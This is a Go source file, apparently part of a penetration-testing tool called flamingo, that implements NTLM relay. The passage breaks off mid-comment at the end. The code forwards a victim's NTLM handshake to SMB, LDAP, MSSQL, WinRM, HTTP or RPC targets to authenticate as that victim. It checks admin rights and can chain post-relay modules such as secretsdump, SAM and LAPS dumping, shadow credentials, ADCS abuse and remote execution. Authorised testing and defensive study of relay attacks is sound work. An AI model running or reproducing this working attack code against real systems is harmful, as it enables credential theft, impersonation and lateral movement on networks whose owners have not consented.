package flamingo

import (
	"context"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/mandiant/gopacket/pkg/relay"
	log "github.com/sirupsen/logrus"
)

// Relay turns flamingo's NTLM capture into an NTLM relay.
//
// Capture answers a victim's NEGOTIATE with flamingo's own fixed challenge and
// refuses the logon. Relay instead opens a connection to a target, forwards
// the victim's NEGOTIATE to it, hands the target's own CHALLENGE back to the
// victim, and forwards the victim's AUTHENTICATE to the target — which
// authenticates to the target as the victim. All of it rides the
// NTLMResponder seam in ntlmcapture.go, so no listener needs to know whether
// it is capturing or relaying.
//
// Three rules shape everything below, and none of them is a default that can
// be drifted away from:
//
//   - Relay is off unless targets are named. NewRelayConfig returns a nil
//     config for an empty target list, NewRelayResponder returns a nil
//     responder for a nil config, and a nil NTLMCapture.Responder or
//     ConfSMB.Responder is capture-only. There is no "enable relay" switch
//     that is not a target list.
//
//   - Nothing is attacked by default. With targets set, the whole action is:
//     authenticate, probe the privilege level, record it, disconnect.
//     Post-relay attack modules run only when named in RelayOptions.Attacks.
//
//   - Relaying never costs a capture. Every path that cannot relay — no
//     target left, target unreachable, target refused the challenge — falls
//     back to flamingo's own fixed challenge so the victim's hash is still
//     recorded, crackable, by the listener that would have captured it
//     anyway. A relay attempt is an opportunistic addition to capture, never
//     a replacement for it.
//
// # Relayed sessions cannot be signed
//
// There is no session key for a relayed session — the victim computes it and
// never sends it — so the relayed session can never sign a message. On top of
// that, gopacket's SMB relay client offers dialects up to SMB 3.0 only, so
// SMB 3.1.1 pre-auth integrity is unavailable as well. A target that requires
// signing therefore accepts the AUTHENTICATE and then refuses every request on
// the session that follows. That is a specific, recognisable outcome rather
// than a generic failure, and relayOutcomeSigning reports it: see
// relaySession.probe.
//
// # Why no listener here is built on upstream's servers
//
// gopacket's relay.extractNTLMType3Info (client.go:544) bounds-checks a
// security buffer with int arithmetic and then slices with the raw uint32.
// Where int is 64 bits that is sound; where it is 32 bits an offset such as
// 0xFFFFFFF0 converts to a negative number, passes the check, and the slice
// panics. It is reached from every one of upstream's own ProtocolServer
// implementations (rpc_server.go, http_server.go, server.go, raw_server.go,
// wcf_server.go) on a message supplied by whoever connected, so it is a
// capture-path hazard, not only a relay one. The panic happens on an upstream
// goroutine, so no recover() of ours contains it and the process dies.
//
// That is why flamingo's SMB, ADWS, MSRPC and WinRM listeners are all its own
// code: every byte an unauthenticated peer sends is parsed by parsers that
// bounds-check. A listener added later must not be built on one of upstream's
// ProtocolServer implementations, or it reintroduces this on the 386 and arm
// builds.
//
// Relaying does not widen the exposure. The relay path drives ProtocolClient
// methods directly -- InitConnection, SendNegotiate, SendAuth, IsAdmin,
// KeepAlive, Kill -- and no client parses the AUTHENTICATE: SendAuth copies
// the bytes into a SESSION_SETUP and sends them. relay.Run is never called,
// SOCKS is never enabled, and the attack modules take a session rather than a
// message.

// Relay target schemes and their default ports. A target named without a
// scheme is SMB, which is what a poisoned name lands on in practice.
var relaySchemePorts = map[string]int{
	"smb":    445,
	"ldap":   389,
	"ldaps":  636,
	"http":   80,
	"https":  443,
	"mssql":  1433,
	"winrm":  5985,
	"winrms": 5986,
	"rpc":    135,
}

// relayRPCMode is the DCE/RPC relay mode handed to gopacket's RPC client.
// TSCH (the task scheduler) is upstream's own default.
const relayRPCMode = "TSCH"

// Timeouts. relayTimeout bounds each individual call into a relay client, so
// a target that accepts a connection and then goes silent cannot hold a
// victim's goroutine. relayIdleGrace is how long past the exchange timeout a
// relayed session is held open waiting for the AUTHENTICATE that may never
// come. relayAttackTimeout bounds one post-relay attack module.
const (
	relayTimeout       = 10 * time.Second
	relayIdleGrace     = 15 * time.Second
	relayAttackTimeout = 5 * time.Minute
	relayResolveLookup = 5 * time.Second
)

// Relay outcomes, as recorded in the outcome field of a _type: "relay"
// record. The first three are what an operator reads first: success means the
// target accepted the victim's credential and gave us a usable session,
// rejected means the credential reached the target and the target said no,
// and anything else means the credential never reached a target at all.
const (
	// relayOutcomeSuccess: the AUTHENTICATE was accepted and the session
	// that followed is usable.
	relayOutcomeSuccess = "success"

	// relayOutcomeRejected: the AUTHENTICATE reached the target and the
	// target refused it.
	relayOutcomeRejected = "rejected"

	// relayOutcomeSigning: the AUTHENTICATE was accepted and the session was
	// then refused, which is what a signing-required target does to a relay
	// that has no session key to sign with.
	relayOutcomeSigning = "signing-required"

	// relayOutcomeUnreachable: the target could not be connected to, or
	// would not produce a challenge, so nothing was ever relayed.
	relayOutcomeUnreachable = "unreachable"

	// relayOutcomeNoTarget: every configured target had already been relayed
	// to under one-shot, so nothing was relayed.
	relayOutcomeNoTarget = "no-target"
)

// RelayTarget is one parsed relay destination.
type RelayTarget struct {
	// Scheme is the lowercased protocol name, one of relaySchemePorts.
	Scheme string

	// Host is a hostname or an IP literal, without brackets.
	Host string

	// Port is the TCP port, defaulted from Scheme when the target named none.
	Port int
}

// Addr is the target as a dialable host:port.
func (t RelayTarget) Addr() string {
	return net.JoinHostPort(t.Host, strconv.Itoa(t.Port))
}

// String is the target in its canonical scheme://host:port form, which is
// also the key one-shot tracking and records use.
func (t RelayTarget) String() string {
	return t.Scheme + "://" + t.Addr()
}

// RelaySchemes lists the target schemes relaying understands, sorted.
func RelaySchemes() []string {
	out := make([]string, 0, len(relaySchemePorts))
	for s := range relaySchemePorts {
		out = append(out, s)
	}
	sort.Strings(out)
	return out
}

// ParseRelayTarget parses one relay target. The accepted forms are
// scheme://host, scheme://host:port, host and host:port, where a bare host is
// SMB and an omitted port is the scheme's default. IPv6 literals are
// bracketed when they carry a port and may be bare when they do not.
//
// Anything else is an error rather than a guess: a relay target is a thing
// flamingo will transmit a victim's credential to, so a typo must stop
// startup rather than silently become some other host.
func ParseRelayTarget(raw string) (RelayTarget, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return RelayTarget{}, errors.New("empty relay target")
	}

	scheme, rest := "smb", raw
	if i := strings.Index(raw, "://"); i >= 0 {
		scheme, rest = strings.ToLower(raw[:i]), raw[i+3:]
	}

	port, ok := relaySchemePorts[scheme]
	if !ok {
		return RelayTarget{}, fmt.Errorf("relay target %q: unsupported scheme %q, want one of %s",
			raw, scheme, strings.Join(RelaySchemes(), ", "))
	}

	// A relay target is a host and a port. Anything a URL would carry past
	// that — a path, a query, credentials — is not something relaying can
	// act on, so it is refused rather than quietly dropped.
	if i := strings.IndexAny(rest, "/?#"); i >= 0 {
		return RelayTarget{}, fmt.Errorf("relay target %q: a relay target is host[:port] with no path", raw)
	}
	if strings.Contains(rest, "@") {
		return RelayTarget{}, fmt.Errorf("relay target %q: a relay target carries no credentials", raw)
	}
	if rest == "" {
		return RelayTarget{}, fmt.Errorf("relay target %q: no host", raw)
	}

	host, portStr := rest, ""
	switch {
	case strings.HasPrefix(rest, "["):
		end := strings.Index(rest, "]")
		if end < 0 {
			return RelayTarget{}, fmt.Errorf("relay target %q: unterminated IPv6 literal", raw)
		}
		host = rest[1:end]
		if tail := rest[end+1:]; tail != "" {
			if !strings.HasPrefix(tail, ":") {
				return RelayTarget{}, fmt.Errorf("relay target %q: trailing %q after the IPv6 literal", raw, tail)
			}
			portStr = tail[1:]
		}
		if net.ParseIP(host) == nil {
			return RelayTarget{}, fmt.Errorf("relay target %q: %q is not an IPv6 address", raw, host)
		}
	case net.ParseIP(rest) != nil:
		// A bare IP literal, v4 or unbracketed v6. No port to split off.
	default:
		if i := strings.LastIndex(rest, ":"); i >= 0 {
			host, portStr = rest[:i], rest[i+1:]
		}
	}

	if portStr != "" {
		n, err := strconv.Atoi(portStr)
		if err != nil || n < 1 || n > 65535 {
			return RelayTarget{}, fmt.Errorf("relay target %q: invalid port %q", raw, portStr)
		}
		port = n
	}
	if err := relayCheckHost(raw, host); err != nil {
		return RelayTarget{}, err
	}

	return RelayTarget{Scheme: scheme, Host: host, Port: port}, nil
}

// relayCheckHost rejects a host that is empty or cannot be a hostname or an
// address, so a malformed target fails at configuration time.
func relayCheckHost(raw, host string) error {
	if host == "" {
		return fmt.Errorf("relay target %q: no host", raw)
	}
	if net.ParseIP(host) != nil {
		return nil
	}
	if len(host) > 253 {
		return fmt.Errorf("relay target %q: host is too long", raw)
	}
	for _, r := range host {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case r == '.', r == '-', r == '_':
		default:
			return fmt.Errorf("relay target %q: %q is not a hostname or an address", raw, host)
		}
	}
	return nil
}

// client builds the gopacket relay client that speaks this target's protocol.
func (t RelayTarget) client() (relay.ProtocolClient, error) {
	addr := t.Addr()
	switch t.Scheme {
	case "smb":
		return relay.NewSMBRelayClient(addr), nil
	case "ldap":
		return relay.NewLDAPRelayClient(addr, false), nil
	case "ldaps":
		return relay.NewLDAPRelayClient(addr, true), nil
	case "http":
		return relay.NewHTTPRelayClient(addr, false), nil
	case "https":
		return relay.NewHTTPRelayClient(addr, true), nil
	case "mssql":
		return relay.NewMSSQLRelayClient(addr), nil
	case "winrm":
		return relay.NewWinRMRelayClient(addr, false), nil
	case "winrms":
		return relay.NewWinRMRelayClient(addr, true), nil
	case "rpc":
		return relay.NewRPCRelayClient(addr, relayRPCMode), nil
	}
	return nil, fmt.Errorf("no relay client for scheme %q", t.Scheme)
}

// RelayPolicy decides which target a victim is relayed to.
type RelayPolicy int

const (
	// RelayPolicyRoundRobin spreads victims across the target list in order.
	RelayPolicyRoundRobin RelayPolicy = iota

	// RelayPolicyFirst sends every victim to the first target still eligible.
	RelayPolicyFirst

	// RelayPolicyRandom picks an eligible target at random.
	RelayPolicyRandom
)

// String renders a policy for the startup banner.
func (p RelayPolicy) String() string {
	switch p {
	case RelayPolicyFirst:
		return "first"
	case RelayPolicyRandom:
		return "random"
	}
	return "round-robin"
}

// RelayOptions is the configuration a caller supplies for relaying, in the
// shape the command line hands it over: strings, not parsed types.
type RelayOptions struct {
	// Targets are relay target strings, each scheme://host[:port], host[:port]
	// or a comma-separated list of either. An empty list means relay stays
	// off, which is the default and the only way relay is ever off.
	Targets []string

	// Attacks are the names of post-relay attack modules to run, from
	// RelayAttackNames. Empty — the default — runs nothing: a successful
	// relay authenticates, reports the privilege level and disconnects.
	Attacks []string

	// Policy selects a target per victim. The zero value is round-robin.
	Policy RelayPolicy

	// OneShot stops relaying to a target once it has accepted a credential,
	// so one engagement does not hammer one host.
	OneShot bool

	// ListenPorts are the ports flamingo itself is listening on. A target on
	// this host and one of these ports is refused: relaying a victim into
	// flamingo's own listener is a loop.
	ListenPorts []uint16

	// Timeout bounds each individual call into a relay client. Zero means
	// relayTimeout.
	Timeout time.Duration

	// RecordWriter receives the relay outcome records.
	RecordWriter *RecordWriter
}

// RelayConfig is a validated relay configuration, shared by every listener
// that relays. It is safe for concurrent use.
//
// Note what it does not hold: a relay.Config. Upstream writes relayedUser,
// relayedDomain and delegateTarget onto a Config from whichever goroutine is
// handling a session, with no lock, so
// one Config shared across concurrent victims is a data race. Every relay
// session here builds its own, and relaySession.cfg is the only place one
// lives.
type RelayConfig struct {
	// Targets are the validated relay destinations, in the order given.
	Targets []RelayTarget

	// Attacks are the resolved post-relay attack modules, empty by default.
	Attacks []relay.AttackModule

	// Policy, OneShot, Timeout and RecordWriter are as in RelayOptions.
	Policy       RelayPolicy
	OneShot      bool
	Timeout      time.Duration
	RecordWriter *RecordWriter

	// newClient builds the relay client for a target. It is a field so tests
	// can substitute a client that does not need a real server; production
	// code leaves it nil and gets RelayTarget.client.
	newClient func(RelayTarget) (relay.ProtocolClient, error)

	m    sync.Mutex
	next int
	done map[string]bool
}

// NewRelayConfig validates relay options into a configuration.
//
// An empty target list returns (nil, nil): relay is off, every listener stays
// capture-only, and there is deliberately no other way to say so. A malformed
// target, an unknown attack name, or a target that resolves to this host is an
// error — relaying is a transmitting behaviour, so a configuration that is not
// obviously right stops startup rather than doing something approximate.
func NewRelayConfig(o RelayOptions) (*RelayConfig, error) {
	return newRelayConfig(o, true)
}

// newRelayConfig is NewRelayConfig with the loop check made optional, so tests
// can relay to a listener on this host on purpose. Nothing outside this
// package can reach it: the exported constructor always checks.
func newRelayConfig(o RelayOptions, checkLoops bool) (*RelayConfig, error) {
	targets, err := relayParseTargets(o.Targets)
	if err != nil {
		return nil, err
	}

	attackNames := relaySplitList(o.Attacks)
	if len(targets) == 0 {
		if len(attackNames) > 0 {
			return nil, errors.New("relay attacks were named but no relay targets were: " +
				"attacks run on a relayed session, so there is nothing for them to run on")
		}
		// No targets, no relay. This is the default.
		return nil, nil
	}

	if checkLoops {
		for _, t := range targets {
			if err := relayCheckLoop(t, o.ListenPorts); err != nil {
				return nil, err
			}
		}
	}

	attacks, err := relayResolveAttacks(attackNames)
	if err != nil {
		return nil, err
	}

	c := &RelayConfig{
		Targets:      targets,
		Attacks:      attacks,
		Policy:       o.Policy,
		OneShot:      o.OneShot,
		Timeout:      o.Timeout,
		RecordWriter: o.RecordWriter,
		done:         make(map[string]bool),
	}
	log.Warn(c.Banner())
	return c, nil
}

// relayParseTargets parses and de-duplicates a target list, accepting both
// repeated flags and comma-separated values in one.
func relayParseTargets(raw []string) ([]RelayTarget, error) {
	var targets []RelayTarget
	seen := make(map[string]bool)
	for _, spec := range relaySplitList(raw) {
		t, err := ParseRelayTarget(spec)
		if err != nil {
			return nil, err
		}
		if seen[t.String()] {
			continue
		}
		seen[t.String()] = true
		targets = append(targets, t)
	}
	return targets, nil
}

// relaySplitList flattens a repeated comma-separated flag into its non-empty
// entries.
func relaySplitList(raw []string) []string {
	var out []string
	for _, item := range raw {
		for _, part := range strings.Split(item, ",") {
			if part = strings.TrimSpace(part); part != "" {
				out = append(out, part)
			}
		}
	}
	return out
}

// Banner is the one-line startup announcement naming what relaying will do.
// Relaying transmits a victim's credential to a third party, so it says so
// loudly and names every target rather than reporting a count.
func (c *RelayConfig) Banner() string {
	if c == nil || len(c.Targets) == 0 {
		return "NTLM relay is OFF: no relay targets configured"
	}
	names := make([]string, 0, len(c.Targets))
	for _, t := range c.Targets {
		names = append(names, t.String())
	}
	attacks := "none"
	if len(c.Attacks) > 0 {
		list := make([]string, 0, len(c.Attacks))
		for _, a := range c.Attacks {
			list = append(list, a.Name())
		}
		attacks = strings.Join(list, ",")
	}
	return fmt.Sprintf("NTLM RELAY IS ON: captured logons will be forwarded to %s "+
		"(selection: %s, one-shot: %t, post-relay attacks: %s)",
		strings.Join(names, ", "), c.Policy, c.OneShot, attacks)
}

// timeout is the configured per-call timeout, or the default.
func (c *RelayConfig) timeout() time.Duration {
	if c != nil && c.Timeout > 0 {
		return c.Timeout
	}
	return relayTimeout
}

// pick selects the target for one victim, honouring the policy and skipping
// targets one-shot has retired. It reports false when nothing is eligible.
func (c *RelayConfig) pick() (RelayTarget, bool) {
	c.m.Lock()
	defer c.m.Unlock()

	n := len(c.Targets)
	if n == 0 {
		return RelayTarget{}, false
	}
	switch c.Policy {
	case RelayPolicyFirst:
		for _, t := range c.Targets {
			if !c.done[t.String()] {
				return t, true
			}
		}
	case RelayPolicyRandom:
		for _, i := range rand.Perm(n) {
			if t := c.Targets[i]; !c.done[t.String()] {
				return t, true
			}
		}
	default:
		for i := 0; i < n; i++ {
			t := c.Targets[c.next%n]
			c.next++
			if !c.done[t.String()] {
				return t, true
			}
		}
	}
	return RelayTarget{}, false
}

// retire takes a target out of rotation after a successful relay, under
// one-shot.
func (c *RelayConfig) retire(t RelayTarget) {
	if !c.OneShot {
		return
	}
	c.m.Lock()
	defer c.m.Unlock()
	c.done[t.String()] = true
}

// client builds the relay client for a target, through the test seam.
func (c *RelayConfig) client(t RelayTarget) (relay.ProtocolClient, error) {
	if c.newClient != nil {
		return c.newClient(t)
	}
	return t.client()
}

// relayCheckLoop refuses a target that is this host. Relaying a victim back
// into flamingo captures a credential flamingo already has and, where the
// target port is one flamingo listens on, loops the victim through the same
// exchange until something gives out.
func relayCheckLoop(t RelayTarget, listenPorts []uint16) error {
	ips, err := relayResolve(t.Host)
	if err != nil {
		return fmt.Errorf("relay target %s cannot be resolved: %w", t, err)
	}
	for _, ip := range ips {
		if !ip.IsLoopback() && !isLocalUnicastIP(ip) {
			continue
		}
		for _, p := range listenPorts {
			if int(p) == t.Port {
				return fmt.Errorf("relay target %s is this host on port %d, which flamingo is "+
					"listening on: relaying a victim back into flamingo is an infinite loop", t, t.Port)
			}
		}
		return fmt.Errorf("relay target %s resolves to this host's own address %s: "+
			"relaying a victim back into flamingo captures nothing new", t, ip)
	}
	return nil
}

// relayResolve resolves a target host to addresses, short-circuiting literals
// so a configuration check never depends on DNS it does not need.
func relayResolve(host string) ([]net.IP, error) {
	if ip := net.ParseIP(host); ip != nil {
		return []net.IP{ip}, nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), relayResolveLookup)
	defer cancel()
	addrs, err := net.DefaultResolver.LookupIPAddr(ctx, host)
	if err != nil {
		return nil, err
	}
	if len(addrs) == 0 {
		return nil, errors.New("no addresses")
	}
	ips := make([]net.IP, 0, len(addrs))
	for _, a := range addrs {
		ips = append(ips, a.IP)
	}
	return ips, nil
}

// relayAttackModules are the post-relay attack modules that can be named.
// Every one of them is opt-in: the map exists so a name can be resolved, not
// so anything runs on its own.
var relayAttackModules = map[string]func() relay.AttackModule{
	"aclabuse":        func() relay.AttackModule { return &relay.ACLAbuseAttack{} },
	"adcs":            func() relay.AttackModule { return &relay.ADCSAttack{} },
	"addcomputer":     func() relay.AttackModule { return &relay.AddComputerAttack{} },
	"adddns":          func() relay.AttackModule { return &relay.DNSRecordAttack{} },
	"delegate":        func() relay.AttackModule { return &relay.DelegateAttack{} },
	"enumlocaladmins": func() relay.AttackModule { return &relay.EnumLocalAdminsAttack{} },
	"gmsa":            func() relay.AttackModule { return &relay.GMSADumpAttack{} },
	"icpr":            func() relay.AttackModule { return &relay.RPCICPRAttack{} },
	"laps":            func() relay.AttackModule { return &relay.LAPSDumpAttack{} },
	"ldapdump":        func() relay.AttackModule { return &relay.LDAPDumpAttack{} },
	"rpctschexec":     func() relay.AttackModule { return &relay.RPCTschExecAttack{} },
	"samdump":         func() relay.AttackModule { return &relay.SAMDumpAttack{} },
	"secretsdump":     func() relay.AttackModule { return &relay.SecretsdumpAttack{} },
	"shadowcreds":     func() relay.AttackModule { return &relay.ShadowCredsAttack{} },
	"shares":          func() relay.AttackModule { return &relay.SharesAttack{} },
	"smbexec":         func() relay.AttackModule { return &relay.SMBExecAttack{} },
	"tschexec":        func() relay.AttackModule { return &relay.TschExecAttack{} },
	"winrmexec":       func() relay.AttackModule { return &relay.WinRMExecAttack{} },
}

// RelayAttackNames lists the post-relay attack modules that can be enabled by
// name, sorted.
func RelayAttackNames() []string {
	out := make([]string, 0, len(relayAttackModules))
	for name := range relayAttackModules {
		out = append(out, name)
	}
	sort.Strings(out)
	return out
}

// relayResolveAttacks turns attack names into modules, refusing an unknown
// name rather than ignoring it: an operator who asked for an attack and got
// silence would conclude the target was not vulnerable.
func relayResolveAttacks(names []string) ([]relay.AttackModule, error) {
	var out []relay.AttackModule
	seen := make(map[string]bool)
	for _, name := range names {
		key := strings.ToLower(name)
		if seen[key] {
			continue
		}
		seen[key] = true
		build, ok := relayAttackModules[key]
		if !ok {
			return nil, fmt.Errorf("unknown relay attack %q, want one of %s",
				name, strings.Join(RelayAttackNames(), ", "))
		}
		out = append(out, build())
	}
	return out, nil
}

// RelayResponder is the NTLMResponder that relays instead of capturing. One
// responder serves every victim of a listener; each victim gets a session,
// a relay client and a relay.Config of its own.
type RelayResponder struct {
	// Conf is the relay configuration. A nil Conf is capture-only.
	Conf *RelayConfig

	m        sync.Mutex
	sessions map[*NTLMExchange]*relaySession
}

// NewRelayResponder returns the responder for conf, or nil when conf is nil
// or names no targets. The return type is the interface rather than the
// concrete type on purpose: a nil *RelayResponder stored in an interface field
// is not a nil interface, and a listener tests its responder for nil to decide
// whether it is capturing or relaying.
func NewRelayResponder(conf *RelayConfig) NTLMResponder {
	if conf == nil || len(conf.Targets) == 0 {
		return nil
	}
	return &RelayResponder{Conf: conf}
}

// relaySession is one victim's relay attempt: the target chosen for it, the
// client connected to that target, and the relay.Config that belongs to it
// alone.
type relaySession struct {
	conf   *RelayConfig
	target RelayTarget
	client relay.ProtocolClient

	// cfg is this session's own relay.Config, handed to attack modules.
	// Upstream writes session fields onto a Config without locking, so this
	// is never shared with another session.
	cfg *relay.Config

	timer *time.Timer
	once  sync.Once
}

// Challenge forwards the victim's NEGOTIATE to a target and returns the
// target's own CHALLENGE, so the victim computes its response against the
// target's challenge rather than flamingo's.
//
// It never returns an error. Every way relaying can fail falls back to
// flamingo's fixed challenge, which keeps the capture — and the crackable
// hash — that the listener would have made anyway.
func (r *RelayResponder) Challenge(x *NTLMExchange) ([]byte, error) {
	fallback := NTLMChallengeMessage(x.Flags)
	if r == nil || r.Conf == nil || len(r.Conf.Targets) == 0 {
		return fallback, nil
	}

	target, ok := r.Conf.pick()
	if !ok {
		r.Conf.record(x, nil, nil, relayOutcomeNoTarget,
			"every configured target has already been relayed to (one-shot)")
		return fallback, nil
	}

	client, err := r.Conf.client(target)
	if err != nil {
		r.Conf.record(x, &target, nil, relayOutcomeUnreachable, err.Error())
		return fallback, nil
	}

	s := &relaySession{conf: r.Conf, target: target, client: client, cfg: &relay.Config{}}

	if err := s.preflight(); err != nil {
		s.close()
		r.Conf.record(x, &target, nil, relayOutcomeUnreachable, "connect: "+err.Error())
		return fallback, nil
	}
	if err := s.call(false, func() error { return client.InitConnection() }); err != nil {
		if !errors.Is(err, errRelayTimeout) {
			// The call returned, so the client is ours to close. After a
			// timeout it belongs to the cleanup goroutine in call instead.
			s.close()
		}
		r.Conf.record(x, &target, nil, relayOutcomeUnreachable, "connect: "+err.Error())
		return fallback, nil
	}

	var type2 []byte
	if err := s.call(true, func() error {
		var e error
		type2, e = client.SendNegotiate(x.Type1)
		return e
	}); err != nil {
		s.close()
		r.Conf.record(x, &target, nil, relayOutcomeUnreachable, "negotiate: "+err.Error())
		return fallback, nil
	}

	challenge := FindNTLMSSP(type2)
	if NTLMMessageType(challenge) != NTLMTypeChallenge {
		s.close()
		r.Conf.record(x, &target, nil, relayOutcomeUnreachable,
			"the target answered the negotiate with something other than a CHALLENGE")
		return fallback, nil
	}

	log.Debugf("relay: forwarding %s from %s to %s", x.Proto, x.RemoteAddr, target)
	r.attach(x, s)
	return challenge, nil
}

// Authenticate forwards the victim's AUTHENTICATE to the target it was
// challenged by and reports whether the target accepted it. The credential has
// already been recorded by the listener before this runs, so a relay that
// fails still leaves the capture behind.
func (r *RelayResponder) Authenticate(x *NTLMExchange, auth *NTLMAuth, type3 []byte) bool {
	if r == nil {
		return false
	}
	s := r.detach(x)
	if s == nil {
		// Never relayed: the fallback challenge was flamingo's own, so the
		// victim's response is worthless to the target and the outcome was
		// recorded when the attempt failed.
		return false
	}

	msg := FindNTLMSSP(type3)
	if NTLMMessageType(msg) != NTLMTypeAuthenticate {
		s.close()
		s.conf.record(x, &s.target, auth, relayOutcomeUnreachable,
			"the victim's reply was not an AUTHENTICATE")
		return false
	}

	if err := s.call(true, func() error { return s.client.SendAuth(msg) }); err != nil {
		s.close()
		s.conf.record(x, &s.target, auth, relayOutcomeRejected, err.Error())
		return false
	}

	admin, alive, reason := s.probe()
	if !alive {
		// The target took the credential and then refused the session. With
		// no session key there is nothing to sign with, so this is what a
		// signing-required target looks like from here.
		s.close()
		s.conf.record(x, &s.target, auth, relayOutcomeSigning,
			"the target accepted the logon and then would not serve the session ("+reason+"); "+
				"a relayed session has no session key to sign with, so this is what a "+
				"signing-required target does")
		return false
	}

	s.conf.retire(s.target)
	fields := map[string]string{"privilege": relayPrivilege(admin)}
	s.conf.recordFields(x, &s.target, auth, relayOutcomeSuccess, "", fields)
	log.Warnf("relay: %s\\%s from %s authenticated to %s as %s",
		auth.Domain, auth.User, x.RemoteAddr, s.target, relayPrivilege(admin))

	if len(s.conf.Attacks) == 0 {
		// The default: authenticate, report, disconnect.
		s.close()
		return true
	}
	// Attacks run on their own goroutine and own the session from here. The
	// victim is released now rather than held for the length of a
	// secretsdump.
	go s.attack(x, auth)
	return true
}

// errRelayTimeout marks a relay call that outlived flamingo's timeout. It
// matters because such a call is still running: the client belongs to the
// goroutine that cleans up after it, and closing it from anywhere else would
// race that goroutine.
var errRelayTimeout = errors.New("the target did not answer in time")

// relayPrivilege names the privilege level a relayed session has.
func relayPrivilege(admin bool) string {
	if admin {
		return "admin"
	}
	return "user"
}

// attach registers a session against its exchange and arms the watchdog that
// releases it if the AUTHENTICATE never arrives. Without the watchdog a victim
// that goes quiet after the challenge would leave a connection to the target
// open for the life of the process.
func (r *RelayResponder) attach(x *NTLMExchange, s *relaySession) {
	r.m.Lock()
	if r.sessions == nil {
		r.sessions = make(map[*NTLMExchange]*relaySession)
	}

	// An HTTP listener hands out one *NTLMExchange per connection, and that
	// pointer is this map's key, so a victim that begins a second NTLM
	// handshake on the same keep-alive connection arrives here with a session
	// already attached. RefuseAuth invites exactly that: a successful Type 3
	// is still answered with a 401, and a WinRM client may simply start over.
	// Overwriting the entry would strand the old session -- nothing left to
	// Kill its client connection to the target -- and leave its watchdog
	// running, which on expiry would detach and close whichever session had
	// since taken its place, killing a live relay and logging it as one that
	// never authenticated. Displace the old session explicitly instead, and
	// close it outside the lock since Kill touches the network.
	old := r.sessions[x]

	s.timer = time.AfterFunc(r.Conf.timeout()+relayIdleGrace, func() {
		if expired := r.detach(x); expired != nil {
			log.Debugf("relay: %s from %s never authenticated, dropping the session to %s",
				x.Proto, x.RemoteAddr, expired.target)
			expired.close()
		}
	})
	r.sessions[x] = s
	r.m.Unlock()

	if old != nil {
		log.Debugf("relay: %s from %s restarted authentication, dropping its earlier session to %s",
			x.Proto, x.RemoteAddr, old.target)
		old.close()
	}
}

// detach removes a session from the responder and disarms its watchdog,
// returning nil when something else got there first.
func (r *RelayResponder) detach(x *NTLMExchange) *relaySession {
	r.m.Lock()
	defer r.m.Unlock()
	s := r.sessions[x]
	if s == nil {
		return nil
	}
	delete(r.sessions, x)
	if s.timer != nil {
		s.timer.Stop()
	}
	return s
}

// preflight proves the target completes a TCP handshake within flamingo's own
// timeout before upstream's client is allowed to dial it.
//
// Upstream dials with a fixed 30-second timeout and no way to shorten it, and
// a call that is still dialling cannot be torn down safely (see call). A
// target that is unroutable, filtered or refusing — which is nearly every dead
// target in practice — is therefore caught here, quickly, in code that owns
// its own deadline.
func (s *relaySession) preflight() error {
	if s.conf.newClient != nil {
		// A substituted client has no socket of its own behind it, so there
		// is nothing to preflight. Only tests substitute one.
		return nil
	}
	conn, err := net.DialTimeout("tcp", s.target.Addr(), s.conf.timeout())
	if err != nil {
		return err
	}
	return conn.Close()
}

// call runs one relay client operation under the configured timeout.
//
// The ProtocolClient interface exposes no deadline of its own and the clients
// keep their connections unexported, so a target that accepts a connection and
// then says nothing would otherwise park the victim's goroutine on a read with
// no deadline. Running the call on its own goroutine is what releases the
// victim; killing the client is what ends the call.
//
// killable says whether the client may be killed from here. Upstream's
// InitConnection assigns the client's connection field with no
// synchronisation, so killing a client that might still be inside it would
// race that assignment — a real race, not a detector artefact. Every later
// call only reads that field, and the receive on done orders the assignment
// before anything here, so those are safe to kill.
//
// A call that is not killable is handed to a reaper instead: the goroutine
// keeps the client until the call returns on its own and closes it then. For
// a target that passed preflight and then went silent at the protocol layer
// that reaper can wait indefinitely, which is the one case this cannot bound
// — upstream reads with no deadline and hands out no handle to the socket.
// The victim is released either way, which is what matters.
func (s *relaySession) call(killable bool, fn func() error) error {
	done := make(chan error, 1)
	go func() { done <- fn() }()

	timer := time.NewTimer(s.conf.timeout())
	defer timer.Stop()
	select {
	case err := <-done:
		return err
	case <-timer.C:
		if killable {
			s.client.Kill()
		} else {
			go func() {
				<-done
				s.client.Kill()
			}()
		}
		return fmt.Errorf("%w: did not answer within %s", errRelayTimeout, s.conf.timeout())
	}
}

// probe establishes what the relayed session is good for, and whether it is
// good for anything at all.
//
// IsAdmin opens an administrative share, KeepAlive an ordinary one. Both
// failing means the target dropped the session the moment it was used, which
// for SMB is signing enforcement; only IsAdmin failing means the session works
// and the victim is not an administrator.
func (s *relaySession) probe() (admin bool, alive bool, reason string) {
	if err := s.call(true, func() error {
		admin = s.client.IsAdmin()
		return nil
	}); err != nil {
		return false, false, err.Error()
	}
	if admin {
		return true, true, ""
	}
	if err := s.call(true, func() error { return s.client.KeepAlive() }); err != nil {
		return false, false, err.Error()
	}
	return false, true, ""
}

// attack runs the configured post-relay modules against the session and
// records one outcome each, then closes the session. It owns the session: the
// victim has already been answered.
func (s *relaySession) attack(x *NTLMExchange, auth *NTLMAuth) {
	defer s.close()

	session := s.client.GetSession()
	for _, module := range s.conf.Attacks {
		name := module.Name()
		done := make(chan error, 1)
		go func() {
			defer func() {
				// Attack modules reach deep into upstream's protocol
				// implementations. One of them panicking must not take
				// flamingo down with it.
				if p := recover(); p != nil {
					done <- fmt.Errorf("panicked: %v", p)
				}
			}()
			done <- module.Run(session, s.cfg)
		}()

		timer := time.NewTimer(relayAttackTimeout)
		var err error
		select {
		case err = <-done:
		case <-timer.C:
			err = fmt.Errorf("did not finish within %s", relayAttackTimeout)
		}
		timer.Stop()

		fields := map[string]string{"attack": name, "attack_result": "ok"}
		if err != nil {
			fields["attack_result"] = "failed"
			fields["error"] = err.Error()
			log.Warnf("relay: attack %s against %s failed: %s", name, s.target, err)
		} else {
			log.Warnf("relay: attack %s against %s succeeded", name, s.target)
		}
		s.conf.recordType(x, "relay_attack", &s.target, auth, relayOutcomeSuccess, "", fields)

		if err != nil {
			// A module that failed may have left the session unusable, so
			// the rest are not run blind against it.
			break
		}
	}
}

// close disconnects the relayed session. It is idempotent: the watchdog and
